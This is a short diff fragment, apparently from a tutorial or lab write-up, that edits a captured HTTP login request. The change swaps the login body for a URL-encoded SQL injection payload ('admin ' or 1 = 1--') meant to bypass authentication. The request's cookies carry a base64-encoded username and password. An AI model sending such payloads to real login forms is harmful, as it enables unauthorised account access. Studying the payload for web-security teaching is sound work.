@@ -16,7 +16,7 @@ Accept-Language: en-US,en;q=0.9
 Cookie: amSessionId=15463717023; ASP.NET_SessionId=sek2c5bdxjyg4h45r5io3h45; amUserInfo=UserName=anNtaXRo&Password=RGVtbzEyMzQ=
 Connection: close
 
-uid=*&passw=Demo1234&btnSubmit=Login
+uid=admin+%27+or+1+%3D+1--&passw=aa&btnSubmit=Login
 
 ```
 ```
